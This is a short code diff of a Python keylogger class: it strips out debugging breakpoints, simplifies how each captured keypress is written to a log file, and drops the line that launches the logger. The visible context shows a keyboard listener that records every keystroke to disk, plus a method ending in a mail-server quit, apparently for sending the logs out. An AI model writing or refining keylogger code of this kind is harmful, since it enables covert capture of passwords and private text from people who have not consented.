@@ -16,17 +16,10 @@ class Keylogger:
         server.quit()
     
     def merge_log(self, key):
-        try:
-            current_key = key.char
-            import ipdb; ipdb.set_trace()
-        except AttributeError:
-            import ipdb; ipdb.set_trace()
-            current_key = "*{}*".format(key.name)
+        current_key = getattr(key,'char','*'+key.name+'*')
         with open(file_path, 'a') as f:
             f.write(current_key) 
     
     def main(self):
         with Listener(on_press=self.merge_log) as listener:
             listener.join()
-
-Keylogger().main()
